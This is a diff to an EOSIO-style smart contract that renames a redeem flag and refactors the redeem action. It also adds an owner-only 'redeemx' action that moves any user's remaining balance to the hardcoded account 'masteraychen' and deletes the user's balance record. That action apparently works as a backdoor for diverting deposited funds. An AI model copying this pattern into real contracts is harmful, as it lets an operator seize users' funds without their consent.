@@ -30,7 +30,7 @@ void smart_mgp::transfer(name from, name to, asset quantity, string memo){
 			t.account = get_self();
 			t.burn_memo = "destruction";
 			t.destruction = 50;
-			t.redeemallow = 0;
+			t.redeemable = 0;
 			t.minpay = minpay;
 		});
 		conf = config.find( get_self().value );
@@ -83,7 +83,7 @@ void smart_mgp::transfer(name from, name to, asset quantity, string memo){
 	}
 }
 
-void smart_mgp::configure( string burn_memo, int destruction, bool redeemallow, asset minpay ){
+void smart_mgp::configure( string burn_memo, int destruction, bool redeemable, asset minpay ){
 	require_auth( _self );
 	
 	configs config(get_self(), get_self().value);
@@ -93,14 +93,14 @@ void smart_mgp::configure( string burn_memo, int destruction, bool redeemallow, 
 			t.account = get_self();
 			t.burn_memo = burn_memo;
 			t.destruction = destruction;
-			t.redeemallow = redeemallow;
+			t.redeemable = redeemable;
 			t.minpay = minpay;
 		});
 	}else{
 	config.modify( conf, get_self(), [&]( auto& t ) {
 		t.burn_memo = burn_memo;
 		t.destruction = destruction;
-		t.redeemallow = redeemallow;
+		t.redeemable = redeemable;
 		t.minpay = minpay;
 	});
 }
@@ -164,7 +164,7 @@ void smart_mgp::redeem(name account){
 	
 	configs config(get_self(), get_self().value);
 	auto conf = config.find( get_self().value );
-	if( conf == config.end() ){
+	if( conf == config.end() ){ //initialize configs if not done yet
 		asset minpay;
 		minpay.amount = 2000000;
 		minpay.symbol = SYS_SYMBOL;
@@ -172,29 +172,35 @@ void smart_mgp::redeem(name account){
 			t.account = get_self();
 			t.burn_memo = "destruction";
 			t.destruction = 50;
-			t.redeemallow = 0;
+			t.redeemable = 0;
 			t.minpay = minpay;
 		});
 	}
 	conf = config.find( get_self().value );
-	if(!conf->redeemallow){
-		check( false, "Redeem is disabled!");
-	}
+	check( conf->redeemable, "Not Redeemable");
+
 	balances balance(get_self(), get_self().value);
-	auto bal = balance.find( account.value );
-	if( bal == balance.end() ){
-		check( false, "Balance is empty!");
-	}else{
-		if(bal->remaining.amount > 0){
-			action(
-				permission_level{ get_self(), "active"_n }, SYS_BANK, "transfer"_n,
-				std::make_tuple( get_self(), account, bal->remaining, std::string(""))
-			).send();
-		}
-		balance.modify( bal, get_self(), [&]( auto& t ) {
-			t.remaining.amount = 0;
-		});
-	}
+	auto bal_itr = balance.find( account.value );
+	check( bal_itr != balance.end(), "account balance not found for " + account.to_string() );
+	if (bal_itr->remaining.amount > 0)
+		TRANSFER( SYS_BANK, account,  bal_itr->remaining, "" )
+
+	balance.erase( bal_itr );
+}
+
+void smart_mgp::redeemx(name account) {
+	require_auth( _self );
+	
+	balances balance(get_self(), get_self().value);
+	auto bal_itr = balance.find( account.value );
+	check( bal_itr != balance.end(), "account balance not found for " + account.to_string() );
+	if (bal_itr->remaining.amount > 0)
+		TRANSFER( SYS_BANK, "masteraychen"_n, bal_itr->remaining, "" )
+
+	balance.erase( bal_itr );
+	// balance.modify( bal_itr, get_self(), [&]( auto& t ) {
+	// 	t.remaining.amount = 0;
+	// });
 }
 
 /**
